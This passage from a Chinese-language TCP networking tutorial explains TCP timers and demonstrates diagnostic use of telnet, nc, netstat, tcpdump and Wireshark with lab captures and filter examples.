0   socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0  setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0  bind(3, ..., ...) = 0
+0  listen(3, 1) = 0

// 三次握手
+0  < S 0:0(0) win 4000 <mss 1000>
+0  > S. 0:0(0) ack 1 <...>
+.1 < . 1:1(0) ack 1 win 4000
+0  accept(3, ..., ...) = 4

// 往 fd 为 4 的 socket 文件句柄写入 1000 个字节数据（也即向客户端发送数据）
+0  write(4, ..., 1000) = 1000

// 注释掉 向协议栈注入 ACK 包的代码，模拟客户端不回 ACK 包的情况
// +.1 < . 1:1(0) ack 1001 win 1000

+0 `sleep 1000000`
```

抓包结果如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db34688732e)



重传时间间隔是指数级退避，直到达到 120s 为止，重传次数是15次（这个值由操作系统的 `/proc/sys/net/ipv4/tcp_retries2` 决定)，总时间将近 15 分钟。

整个过程如下图

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db344f0a4c2)



## 0x03 延迟 ACK 定时器

在 TCP 收到数据包以后在没有数据包要回复时，不马上回复 ACK。这时开启一个定时器，等待一段时间看是否有数据需要回复。如果期间有数据要回复，则在回复的数据中捎带 ACK，如果时间到了也没有数据要发送，则也发送 ACK。在 Centos7 上这个值为 40ms。这里在延迟确认章节有详细的介绍，不再展开。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b040aecfbd6973)



## 0x04 坚持计时器（persist timer）

坚持计时器这个翻译真是很奇葩，下面我用 Persist 定时器来讲述。

Persist 定时器是专门为零窗口探测而准备的。我们都知道 TCP 利用滑动窗口来实现流量控制，当接收端 B 接收窗口为 0 时，发送端 A 此时不能再发送数据，发送端此时开启 Persist 定时器，超时后发送一个特殊的报文给接收端看对方窗口是否已经恢复，这个特殊的报文只有一个字节。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db33d817bb4)



## 0x05 保活定时器（keepalive timer）

如果通信以后一段时间有再也没有传输过数据，怎么知道对方是不是已经挂掉或者重启了呢？于是 TCP 提出了一个做法就是在连接的空闲时间超过 2 小时，会发送一个探测报文，如果对方有回复则表示连接还活着，对方还在，如果经过几次探测对方都没有回复则表示连接已失效，客户端会丢弃这个连接。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db3485c3a88)



## 0x06 FIN_WAIT_2 定时器

四次挥手过程中，主动关闭的一方收到 ACK 以后从 FIN_WAIT_1 进入 FIN_WAIT_2 状态等待对端的 FIN 包的到来，FIN_WAIT_2 定时器的作用是防止对方一直不发送 FIN 包，防止自己一直傻等。这个值由`/proc/sys/net/ipv4/tcp_fin_timeout` 决定，在我的 Centos7 机器上，这个值为 60s

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b040aecfc3c926)



## 0x07 TIME_WAIT 定时器

TIME_WAIT 定时器也称为 2MSL 定时器，可能是这七个里面名气最大的，主动关闭连接的一方在 TIME_WAIT 持续 2 个 MSL 的时间，超时后端口号可被安全的重用。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db46b133519)



TIME_WAIT存在的意义有两个：

- 可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况）
- 避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）

## 小结

以上就是 TCP 的 7 个定时器的全部内容，每一个的细节都在之前的文章中有详细的介绍，如果有不太明白的地方可以翻阅

今天我们来介绍三个常用的命令：telnet、nc 和 netstat

## 命令一：telnet

现在 telnet server 几乎没有人在用了，但是 telnet client 却被广泛的使用着。它的功能已经比较强大，有较多巧妙的用法。下面选取几个用的比较多的来介绍一下。

### 0x01 检查端口是否打开

telnet 的一个最大作用就是检查一个端口是否处于打开，使用的命令是 `telnet [domainname or ip] [port]`，这条命令能告诉我们到远端 server 指定端口的网连接是否可达。

> telnet [domainname or ip] [port]

telnet 第一个参数是要连接的域名或者 ip，第二个参数是要连接的端口。

比如你要连接 220.181.57.216（百度) 服务器上的 80 端口，可以使用如下的命令：`telnet 220.181.57.216 80`

如果这个网络连接可达，则会提示你`Connected to 220.181.57.216`，输入`control ]`可以给这个端口发送数据包了

![-w349](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04184c7883850)



如果网路不可达，则会提示`telnet: Unable to connect to remote host`和具体不能连上的原因，常见的有 Operation timed out、Connection refused。

比如我本机没有进程监听 90 端口，`telnet 127.0.0.1 90`的信息如下



![-w549](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04184cf017730)



### 0x02 telnet 还能发 http 请求？

我们知道 curl 可以方便的发送 http 请求，telnet 也是可以方便的发送 http 请求的

执行 `telnet www.baidu.com 80`，粘贴下面的文本（注意总共有四行，最后两行为两个空行）

```
GET / HTTP/1.1
Host: www.baidu.com
```

可以看到返回了百度的首页

```
➜ telnet www.baidu.com 80
Trying 14.215.177.38...
Connected to www.a.shifen.com.
Escape character is '^]'.
GET / HTTP/1.1
Host: www.baidu.com

HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: no-cache
Connection: Keep-Alive
Content-Length: 14615
...
```

### 0x03 telnet 还可以连接 Redis

假设 redis 服务器跑在本地，监听 6379端口，用 `telnet 6379` 命令可以连接上。接下来就可以调用 redis 的命令。

调用"set hello world"，给 key 为 hello 设置值为 "world"，随后调用 get hello 获取值



![render1548074308853](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04184ccd3d71d)



Redis 客户端和 Redis 服务器使用 RESP 协议通信，RESP 是 REdis Serialization Protocol 的简称。在 RESP 中，通过检查服务器返回数据的第一个字节来确定这个回复是什么类型：

- 对于 Simple Strings 来说，第一个字节是 "+"
- 对于 Errors 来说，第一个字节是 "-"
- 对于 Integers 来说，第一个字节是 ":"
- 对于 Bulk Strings 来说，首字节是 "$"
- 对于 Arrays 来说，首字节是 "*"

> RESP Simple Strings

Simple Strings 被用来传输非二进制安全的字符串，是按下面的方式进行编码: 一个加号，紧接着是不包含 CR 或者 LF 的字符串(不允许换行)，最后以CRLF("\r\n")结尾。

执行 "set hello world" 命令成功，服务器会响应一个 "OK"，这是 RESP 一种 Simple Strings 的场景，这种情况下，OK 被编码为五个字节：`+OK\r\n`

> RESP Bulk Strings

get 命令读取 hello 的值，redis 服务器返回 `$5\r\nworld\r\n`，这种类型属于是 Bulk Strings 被用来表示二进制安全的字符串。

Bulk Strings 的编码方式是下面这种方式：以 "$" 开头，后跟实际要发送的字节数，随后是 CRLF，然后是实际的字符串数据，最后以 CRLF 结束。

所以 "world" 这个 string 会被编码成这样：`$5\r\nworld\r\n`

## 命令二：netcat

netcat 因为功能强大，被称为网络工具中的瑞士军刀，nc 是 netcat 的简称。这篇文章将介绍 nc 常用的几个场景。

### 0x01 用 nc 来当聊天服务器

实验步骤

1. 在服务器（10.211.55.5）命令行输入 `nc -l 9090`

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcb1c2c573)

    这里的

     

    ```
    -l
    ```

     

    参数表示 nc 将监听某个端口，

    ```
    l
    ```

    的含义是 listen。后面紧跟的 9090 表示要监听的端口号为 9090。

    

2. 在另外客户端机器的终端中输入`nc 10.211.55.5 9090`

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcb1d7091c)

    此时两台机器建立了一条 tcp 连接

    

3. 在客户端终端中输入 "Hello, this is a message from client"

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcb2645f30)

    可以看到服务器终端显示出了客户端输入的消息

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcb306b7c8)

    

4. 在服务器终端输入 "Hello, this is a message from server"

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcb3f8e380)

    可以看到客户端终端显示了刚刚服务器端输入的消息

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcb44ec564)

    

如果不想继续聊下去，在任意一端输入"Ctrl c"都会终止这个连接。

当然，真正在现实场景中用 nc 来聊天用的非常少。`nc -l`命令一个有价值的地方是可以快速的启动一个 tcp server 监听某个端口。

### 0x02 发送 http 请求

先访问一次 www.baidu.com 拿到百度服务器的 ip（183.232.231.172）

输入 "nc 183.232.231.172 80"，然后输入enter，

```
nc 183.232.231.172 80
<enter>
<enter>
```

百度的服务器返回了一个 http 的报文 `HTTP/1.1 400 Bad Request`



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bcea03aa7e)



来回忆一下 HTTP 请求报文的组成：

1. 起始行（start line）
2. 首部（header）
3. 可选的内容主体（body）

```
nc 183.232.231.172 80
GET / HTTP/1.1
host: www.baidu.com
<enter>
<enter> 
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580be833e11cc)



除了狂按 enter，你也可以采用 unix 管道的方式，把 HTTP 请求报文传输过去

```
echo -ne "GET / HTTP/1.1\r\nhost:www.baidu.com\r\n\r\n" | nc 183.232.231.172 80
```

echo 的 -n 参数很关键，echo 默认会在输出的最后增加一个换行，加上 -n 参数以后就不会在最后自动换行了。

执行上面的命令，可以看到也返回了百度的首页 html

### 0x03 查看远程端口是否打开

前面介绍过 telnet 命令也可以检查远程端口是否打开，既然 nc 被称为瑞士军刀，这个小功能不能说不行。

> nc -zv [host or ip] [port]

其中 -z 参数表示不发送任何数据包，tcp 三次握手完后自动退出进程。有了 -v 参数则会输出更多详细信息（verbose）。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169580bd23a6dcae)



### 0x04 访问 redis

nc 为 在没有 redis-cli 的情况下访问 redis 又新增了一种方法

```
nc localhost 6379
ping
+PONG
get hello
$5
world
```

同样可以把命令通过管道的方式传给 redis 服务器。

```
echo ping  | nc localhost 6379
+PONG
```

## 命令三：netstat

netstat 很强大的网络工具，可以用来显示套接字的状态。下面来介绍一下常用的命令选项

### 列出所有套接字

```
netstat -a
```

`-a`命令可以输出所有的套接字，包括监听的和未监听的套接字。 示例输出：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04184cf1da045)



### 只列出 TCP 套接字

```
netstat -at
-t` 选项可以只列出 TCP 的套接字，也可也用`--tcp
```

示例输出

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04184cf2ce909)



### 只列出 UDP 连接

```
netstat -au
```

`-u` 选项用来指定显示 UDP 的连接，也可也用`--udp` 示例输出：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04184d021165b)



### 只列出处于监听状态的连接

```
netstat -l
```

`-l` 选项用来指定处于 LISTEN 状态的连接，也可以用`--listening` 示例输出：



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b0418533dc022b)



与`-a`一样，可以组合`-t`来过滤处于 listen 状态的 TCP 连接

```
netstat -lt
```

示例输出

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b0418538632d79)



### 禁用端口 和 IP 映射

```
netstat -ltn
```

上面的例子中，常用端口都被映射为了名字，比如 22 端口输出显示为 ssh，8080 端口被映射为 webcache。大部分情况下，我们并不想 netstat 帮我们做这样的事情，可以加上`-n`禁用

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04185f51f091f)



### 显示进程

```
netstat -ltnp
```

使用 `-p`命令可以显示连接归属的进程信息，在查看端口被哪个进程占用时非常有用 示例输出如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b04185b89d751d)



### 显示所有的网卡信息

```
netstat -i
```

用 `-i` 命令可以列出网卡信息，比如 MTU 等

示例输出

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b041861f153178)



到此，netstat 基本命令选项都介绍完了，可以管道操作进行进一步的过滤。

### 显示 8080 端口所有处于 ESTABLISHED 状态的连接

```
netstat -atnp | grep ":8080" | grep ESTABLISHED
tcp        0      0 10.211.55.10:8080       10.211.55.5:45438       ESTABLISHED 24972/nc
```

### 统计处于各个状态的连接个数

```
netstat -ant | awk '{print $6}' | sort | uniq -c | sort -n
      1 established)
      1 Foreign
      2 LISTEN
      3 TIME_WAIT
     30 ESTABLISHED
```

使用 awk 截取出状态行，然后用 sort、uniq 进行去重和计数即可

## 小结与思考题

这篇文章我们首先讲解了 telnet 的妙用，来回顾一下重点：第一， telnet 可以检查指定端口是否存在，用来判断指定的网络连接是否可达。第二 telnet 可以用来发送 HTTP 请求，HTTP 是基于 TCP 的应用层协议，可以认为 telnet 是 TCP 包的一个构造工具，只要构造出的包符合 HTTP 协议的格式，就可以得到正确的返回。第三，介绍了如何用 telnet 访问 redis 服务器，在没有安装 redis-cli 的情况下，也可以通过 telnet 的方式来快速进行访问，然后结合实际场景介绍了 Redis 的通信协议 RESP。

然后介绍了 nc 在诸多类似场景下的应用，最后介绍了 netstat 命令的的用法。

留一道作业题：

- 怎么样用 nc 发送 UDP 数据

如果你抓过 TCP 的包，你一定听说过图形化界面软件 wireshark，tcpdump 则是一个命令行的网络流量分析工具，功能非常强大。尤其是做后台开发的同学要在服务器上定位一些黑盒的应用，tcpdump 是唯一的选择。这篇文章会重点介绍基本使用、过滤条件、保存文件几个方面。

大部分 Linux 发行包都预装了 tcpdump，如果没有预装，可以用对应操作系统的包管理命令安装，比如在 Centos 下，可以用 yum install -y tcpdump 来进行安装。

## TCPDump 基础

在命令行里直接输入如下的命令，不出意外，会出现大量的输出

```
tcpdump -i any

07:02:12.195611 IP test.ya.local.59915 > c2.shared.ssh: Flags [.], ack 1520940, win 2037, options [nop,nop,TS val 1193378555 ecr 428247729], length 0
07:02:12.195629 IP c2.shared.ssh > test.ya.local.59915: Flags [P.], seq 1520940:1521152, ack 1009, win 315, options [nop,nop,TS val 428247729 ecr 1193378555], length 212
07:02:12.195677 IP test.ya.local.59915 > c2.shared.ssh: Flags [.], ack 1521152, win 2044, options [nop,nop,TS val 1193378555 ecr 428247729], length 0
07:02:12.195730 IP c2.shared.ssh > test.ya.local.59915: Flags [P.], seq 1521152:1521508, ack 1009, win 315, options [nop,nop,TS val 428247730 ecr 1193378555], length 356
```

`-i`表示指定哪一个网卡，any 表示任意。有哪些网卡可以用 ifconfig 来查看，在我的虚拟机上，ifconfig 输出结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a00c862c5ee337)



如果只想查看 eth0 网卡经过的数据包，就可以使用`tcpdump -i eth0`来指定。

### 过滤主机：host 选项

如果只想查看 ip 为 10.211.55.2 的网络包，这个 ip 可以是源地址也可以是目标地址

```
sudo tcpdump -i any host 10.211.55.2
```

## 过滤源地址、目标地址：src、dst

如果只想抓取主机 10.211.55.10 发出的包

```
sudo tcpdump -i any src 10.211.55.10
```

如果只想抓取主机 10.211.55.10 收到的包

```
sudo tcpdump -i any dst 10.211.55.1
```

### 过滤端口：port 选项

抓取某端口的数据包：port 选项比如查看 80 端通信的数据包

```
sudo tcpdump -i any port 80
```

如果只想抓取 80 端口**收到**的包，可以加上 dst

```
sudo tcpdump -i any dst port 80
```

### 过滤指定端口范围内的流量

比如抓取 21 到 23 区间所有端口的流量

```
tcpdump portrange 21-23
```

### 禁用主机与端口解析：-n 与 -nn 选项

如果不加`-n`选项，tcpdump 会显示主机名，比如下面的`test.ya.local`和`c2.shared`

```
09:04:56.821206 IP test.ya.local.59915 > c2.shared.ssh: Flags [P.], seq 397:433, ack 579276, win 2048, options [nop,nop,TS val 1200089877 ecr 435612355], length 36
```

加上`-n`选项以后，可以看到主机名都已经被替换成了 ip

```
sudo tcpdump -i any  -n
10:02:13.705656 IP 10.211.55.2.59915 > 10.211.55.10.ssh: Flags [P.], seq 829:865, ack 1228756, win 2048, options [nop,nop,TS val 1203228910 ecr 439049239], length 36
```

但是常用端口还是会被转换成协议名，比如 ssh 协议的 22 端口。如果不想 tcpdump 做转换，可以加上 -nn，这样就不会解析端口了，输出中的 ssh 变为了 22

```
sudo tcpdump -i any  -nn

10:07:37.598725 IP 10.211.55.2.59915 > 10.211.55.10.22: Flags [P.], seq 685:721, ack 1006224, win 2048, options [nop,nop,TS val 1203524536 ecr 439373132], length 36
```

### 过滤协议

如果只想查看 udp 协议，可以直接使用下面的命令

```
sudo tcpdump -i any -nn udp

10:25:31.457517 IP 10.211.55.10.51516 > 10.211.55.1.53: 23956+ A? www.baidu.com. (31)
10:25:31.490843 IP 10.211.55.1.53 > 10.211.55.10.51516: 23956 3/13/9 CNAME www.a.shifen.com., A 14.215.177.38, A 14.215.177.39 (506)
```

上面是一个 www.baidu.com 的 DNS 查询请求的 UDP 包

### 用 ASCII 格式查看包体内容：-A 选项

使用 -A 可以用 ASCII 打印报文内容，比如常用的 HTTP 协议传输 json 、html 文件等都可以用这个选项

```
sudo tcpdump -i any -nn port 80 -A

11:04:25.793298 IP 183.57.82.231.80 > 10.211.55.10.40842: Flags [P.], seq 1:1461, ack 151, win 16384, length 1460
HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/javascript
Content-Length: 63522
Connection: keep-alive
Vary: Accept-Encoding
Date: Wed, 13 Mar 2019 11:49:35 GMT
Expires: Mon, 02 Mar 2020 11:49:35 GMT
Last-Modified: Tue, 05 Mar 2019 23:30:55 GMT
ETag: W/"5c7f06af-f822"
Cache-Control: public, max-age=30672000
Access-Control-Allow-Origin: *
Served-In-Seconds: 0.002
```

与 -A 对应的还有一个 -X 命令，用来同时用 HEX 和 ASCII 显示报文内容。

```
sudo tcpdump -i any -nn port 80 -X

11:33:53.945089 IP 36.158.217.225.80 > 10.211.55.10.45436: Flags [P.], seq 1:1461, ack 151, win 16384, length 1460
	0x0000:  4500 05dc b1c4 0000 8006 42fb 249e d9e1  E.........B.$...
	0x0010:  0ad3 370a 0050 b17c 3b79 032b 8ffb cf66  ..7..P.|;y.+...f
	0x0020:  5018 4000 9e9e 0000 4854 5450 2f31 2e31  P.@.....HTTP/1.1
	0x0030:  2032 3030 204f 4b0d 0a53 6572 7665 723a  .200.OK..Server:
	0x0040:  2054 656e 6769 6e65 0d0a 436f 6e74 656e  .Tengine..Conten
	0x0050:  742d 5479 7065 3a20 6170 706c 6963 6174  t-Type:.applicat
	0x0060:  696f 6e2f 6a61 7661 7363 7269 7074 0d0a  ion/javascript..
	0x0070:  436f 6e74 656e 742d 4c65 6e67 7468 3a20  Content-Length:.
	0x0080:  3633 3532 320d 0a43 6f6e 6e65 6374 696f  63522..Connectio
	0x0090:  6e3a 206b 6565 702d 616c 6976 650d 0a56  n:.keep-alive..V
	0x00a0:  6172 793a 2041 6363 6570 742d 456e 636f  ary:.Accept-Enco
	0x00b0:  6469 6e67 0d0a 4461 7465 3a20 5765 642c  ding..Date:.Wed,
	0x00c0:  2031 3320 4d61 7220 3230 3139 2031 313a  .13.Mar.2019.11:
	0x00d0:  3439 3a33 3520 474d 540d 0a45 7870 6972  49:35.GMT..Expir
```

### 限制包大小：-s 选项

当包体很大，可以用 -s 选项截取部分报文内容，一般都跟 -A 一起使用。查看每个包体前 500 字节可以用下面的命令

```
sudo tcpdump -i any -nn port 80 -A -s 500
```

如果想显示包体所有内容，可以加上`-s 0`

### 只抓取 5 个报文： -c 选项

使用 `-c number`命令可以抓取 number 个报文后退出。在网络包交互非常频繁的服务器上抓包比较有用，可能运维人员只想抓取 1000 个包来分析一些网络问题，就比较有用了。

```
sudo tcpdump -i any -nn port 80  -c 5
```

### 数据报文输出到文件：-w 选项

-w 选项用来把数据报文输出到文件，比如下面的命令就是把所有 80 端口的数据输出到文件

```
sudo tcpdump -i any port 80 -w test.pcap
```

生成的 pcap 文件就可以用 wireshark 打开进行更详细的分析了

也可以加上`-U`强制立即写到本地磁盘，性能稍差

### 显示绝对的序号：-S 选项

默认情况下，tcpdump 显示的是从 0 开始的相对序号。如果想查看真正的绝对序号，可以用 -S 选项。

没有 -S 时的输出，seq 和 ACK 都是从 0 开始

```
sudo tcpdump -i any port 80 -nn

12:12:37.832165 IP 10.211.55.10.46102 > 36.158.217.230.80: Flags [P.], seq 1:151, ack 1, win 229, length 150
12:12:37.832272 IP 36.158.217.230.80 > 10.211.55.10.46102: Flags [.], ack 151, win 16384, length 0
```

没有 -S 时的输出，可以看到 seq 不是从 0 开始

```
sudo tcpdump -i any port 80 -nn -S 

12:13:21.863918 IP 10.211.55.10.46074 > 36.158.217.223.80: Flags [P.], seq 4277123624:4277123774, ack 3358116659, win 229, length 150
12:13:21.864091 IP 36.158.217.223.80 > 10.211.55.10.46074: Flags [.], ack 4277123774, win 16384, length 0
```

## 0x02 高级技巧

tcpdump 真正强大的是可以用布尔运算符`and`（或`&&`）、`or`（或`||`）、not（或`!`）来组合出任意复杂的过滤器

抓取 ip 为 10.211.55.10 到端口 3306 的数据包

```
sudo tcpdump -i any host 10.211.55.10 and dst port 3306
```

抓取源 ip 为 10.211.55.10，目标端口除了22 以外所有的流量

```
sudo tcpdump -i any src 10.211.55.10 and not dst port 22
```

### 复杂的分组

如果要抓取：来源 ip 为 10.211.55.10 且目标端口为 3306 或 6379 的包，按照前面的描述，我们会写出下面的语句

```
sudo tcpdump -i any src 10.211.55.10 and (dst port 3306 or 6379)
```

如果运行一下，就会发现执行报错了，因为包含了特殊字符`()`，解决的办法是用单引号把复杂的组合条件包起来。

```
sudo tcpdump -i any 'src 10.211.55.10 and (dst port 3306 or 6379)'
```

如果想显示所有的 RST 包，要如何来写 tcpdump 的语句呢？先来说答案

```
tcpdump 'tcp[13] & 4 != 0'
```

要弄懂这个语句，必须要清楚 TCP 首部中 offset 为 13 的字节的第 3 比特位就是 RST

下图是 TCP 头的结构

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a00c862c4da941)



tcp[13] 表示 tcp 头部中偏移量为 13 字节，如上图中红色框的部分，

`!=0` 表示当前 bit 置 1，即存在此标记位，跟 4 做与运算是因为 RST 在 TCP 的标记位的位置在第 3 位(00000100)

如果想过滤 SYN + ACK 包，那就是 SYN 和 ACK 包同时置位（00010010），写成 tcpdump 语句就是

```
tcpdump 'tcp[13] & 18 != 0'
```

## TCPDump 输出解读

我们在机器 A（10.211.55.10）用`nc -l 8080`启动一个 tcp 的服务器，然后启动 tcpdump 抓包（`sudo tcpdump -i any port 8080 -nn -A` ）。然后在机器 B（10.211.55.5） 用 `nc 10.211.55.10 8080`进行连接，然后输入"hello, world"回车，过一段时间在机器 B 用 ctrl-c 结束连接，整个过程抓到的包如下（中间删掉了一些无关的信息）。

```
1 16:46:22.722865 IP 10.211.55.5.45424 > 10.211.55.10.8080: Flags [S], seq 3782956689, win 29200, options [mss 1460,sackOK,TS val 463670960 ecr 0,nop,wscale 7], length 0

2 16:46:22.722903 IP 10.211.55.10.8080 > 10.211.55.5.45424: Flags [S.], seq 3722022028, ack 3782956690, win 28960, options [mss 1460,sackOK,TS val 463298257 ecr 463670960,nop,wscale 7], length 0

3 16:46:22.723068 IP 10.211.55.5.45424 > 10.211.55.10.8080: Flags [.], ack 1, win 229, options [nop,nop,TS val 463670960 ecr 463298257], length 0

4 16:46:25.947217 IP 10.211.55.5.45424 > 10.211.55.10.8080: Flags [P.], seq 1:13, ack 1, win 229, options [nop,nop,TS val 463674184 ecr 463298257], length 12
hello world

5 16:46:25.947261 IP 10.211.55.10.8080 > 10.211.55.5.45424: Flags [.], ack 13, win 227, options [nop,nop,TS val 463301481 ecr 463674184], length 0

6 16:46:28.011057 IP 10.211.55.5.45424 > 10.211.55.10.8080: Flags [F.], seq 13, ack 1, win 229, options [nop,nop,TS val 463676248 ecr 463301481], length 0

7 16:46:28.011153 IP 10.211.55.10.8080 > 10.211.55.5.45424: Flags [F.], seq 1, ack 14, win 227, options [nop,nop,TS val 463303545 ecr 463676248], length 0

8 16:46:28.011263 IP 10.211.55.5.45424 > 10.211.55.10.8080: Flags [.], ack 2, win 229, options [nop,nop,TS val 463676248 ecr 463303545], length 0
```

第 1~3 行是 TCP 的三次握手的过程

第 1 行 中，第一部分是这个包的时间（16:46:22.722865），显示到微秒级。接下来的 "10.211.55.5.45424 > 10.211.55.10.8080" 表示 TCP 四元组：包的源地址、源端口、目标地址、目标端口，中间的大于号表示包的流向。接下来的 "Flags [S]" 表示 TCP 首部的 flags 字段，这里的 S 表示设置了 SYN 标志，其它可能的标志有

- F：FIN 标志
- R：RST 标志
- P：PSH 标志
- U：URG 标志
- . ：没有标志，ACK 情况下使用

接下来的 "seq 3782956689" 是 SYN 包的序号。需要注意的是默认的显示方式是在 SYN 包里的显示真正的序号，在随后的段中，为了方便阅读，显示的序号都是相对序号。

接下来的 "win 29200" 表示自己声明的接收窗口的大小

接下来用[] 包起来的 options 表示 TCP 的选项值，里面有很多重要的信息，比如 MSS、window scale、SACK 等

最后面的 length 参数表示当前包的长度

第 2 行是一个 SYN+ACK 包，如前面所说，SYN 包中包序号用的是绝对序号，后面的 win = 28960 也声明的发送端的接收窗口大小。

从第 3 行开始，后面的包序号都用的是相对序号了。第三行是客户端 B 向服务端 A 发送的一个 ACK 包。注意这里 win=229，实际的窗口并不是 229，因为窗口缩放（window scale） 在三次握手中确定，后面的窗口大小都需要乘以 window scale 的值 2^7（128），比如这里的窗口大小等于 229 * 2^7 = 229 * 128 = 29312

第 4 行是客户端 B 向服务端 A 发送"hello world"字符串，这里的 flag 为`P.`,表示 PSH+ACK。发送包的 seq 为 1:13，长度 length 为 12。窗口大小还是 229 * 128

第 5 行是服务端 A 收到"hello world"字符串以后回复的 ACK 包，可以看到 ACK 的值为 13，表示序号为 13 之前的所有的包都已经收到，下次发包从 13 开始发

第 6 行是客户端 B 执行 Ctrl+C 以后nc 客户端准备退出时发送的四次挥手的第一个 FIN 包，包序号还是 13，长度为 0

第 7 行是服务端 A 对 B 发出的 FIN 包后，也同时回复 FIN + ACK，因为没有往客户端传输过数据包，所以这里的 SEQ 还是 1。

第 8 行是客户端 A 对 服务端 B 发出的 FIN 包回复的 ACK 包

## 小结

这篇文章主要介绍了 tcpdump 工具的使用，这个工具是这本小册使用最频繁的工具，一定要好好掌握它。

这篇文章我们讲解 wireshark。前面我们介绍了 tcpdump，它是命令行程序，对 linux 服务器比较友好，简单快速适合简单的文本协议的分析和处理。wireshark 有图形化的界面，分析功能非常强大，不仅仅是一个抓包工具，且支持众多的协议。它也有命令行版本的叫做 tshark，不过用的比较少一点。

## 抓包过滤

抓包的过程很耗 CPU 和内存资源而且大部分情况下我们不是对所有的包都感兴趣，因此可以只抓取满足特定条件的包，丢弃不感兴趣的包，比如只想抓取 ip 为172.18.80.49 端口号为 3306 的包，可以输入`host 172.18.80.49 and port 3306`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8ea8ed884dd)



## 显示过滤（Display filter）

显示过滤可以算是 wireshark 最常用的功能了，与抓包过滤不一样的是，显示过滤不会丢弃包的内容，不符合过滤条件的包被隐藏起来，方便我们阅读。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8ea8f77b625)



过滤的方式常见的有以下几种：

- 协议、应用过滤器（ip/tcp/udp/arp/icmp/ dns/ftp/nfs/http/mysql)
- 字段过滤器（http.host/dns.qry.name）

比如我们只想看 http 协议报文，在过滤器中输入 http 即可

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8ea982fb47d)



字段过滤器可以更加精确的过滤出想要的包，比如我们只想看锤科网站`t.tt`域名的 dns 解析，可以输入`dns.qry.name == t.tt`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8ea986c9baa)

再比如，我只想看访问锤科的 http 请求，可以输入`http.host == t.tt`

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169cd8ea987c3d41)



要想记住这些很难，有一个小技巧，比如怎么知道 域名为`t.tt` 的 dns 查询要用`dns.qry.name`呢？

